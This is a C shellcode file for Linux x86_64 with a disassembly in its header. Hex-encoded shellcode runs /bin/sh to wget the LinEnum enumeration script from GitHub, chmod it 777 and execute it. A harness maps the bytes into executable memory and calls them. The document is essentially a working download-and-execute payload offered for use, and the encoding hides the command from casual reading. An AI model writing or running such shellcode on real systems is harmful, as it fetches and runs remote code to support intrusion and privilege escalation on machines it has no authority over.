/*
LinEnum (Linux Enumeration) Wget & CHMOD & Run Shellcode Language C & ASM - Linux/x86_64

author : Kağan Çapar
contact: kagancapar@gmail.com
shellcode len : 155 bytes
compilation: gcc -o shellcode shellcode.c

test:
run ./shellcode

description: First, the linenum script is via github with wget command. After change mod 777 and run!

assembly:

_start:
push    0x3b {var_8}  {"content.com/rebootuser/LinEnum/m…"}
pop     rax {var_8}  {0x3b, "content.com/rebootuser/LinEnum/m…"}
cdq     {0x3b, "content.com/rebootuser/LinEnum/m…"}  {0x0}  {0x3b, "content.com/rebootuser/LinEnum/m…"}
mov     rbx, 0x68732f6e69622f
push    rbx {var_8}  {0x68732f6e69622f}
mov     rdi, rsp {var_8}
push    0x632d {var_10}
mov     rsi, rsp {var_10}
push    rdx {var_18}  {0x0}
call    sub_94  {sub_20, "wget https://raw.githubuserconte…"} { Falls through into sub_20 }

*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char library[] =
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x74\x00"
"\x00\x00\x77\x67\x65\x74\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f"
"\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63"
"\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x72\x65\x62\x6f"
"\x6f\x74\x75\x73\x65\x72\x2f\x4c\x69\x6e\x45\x6e\x75\x6d\x2f"
"\x6d\x61\x73\x74\x65\x72\x2f\x4c\x69\x6e\x45\x6e\x75\x6d\x2e"
"\x73\x68\x20\x26\x26\x20\x63\x68\x6d\x6f\x64\x20\x37\x37\x37"
"\x20\x4c\x69\x6e\x45\x6e\x75\x6d\x2e\x73\x68\x20\x26\x26\x20"
"\x2e\x2f\x4c\x69\x6e\x45\x6e\x75\x6d\x2e\x73\x68\x00\x56\x57"
"\x48\x89\xe6\x0f\x05";

int main(int argc, char **argv) {
    printf("library Length: %zd Bytes\n", strlen(library));

    void *ptr = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, library, sizeof(library));
    sc = ptr;

    sc();

    return 0;
}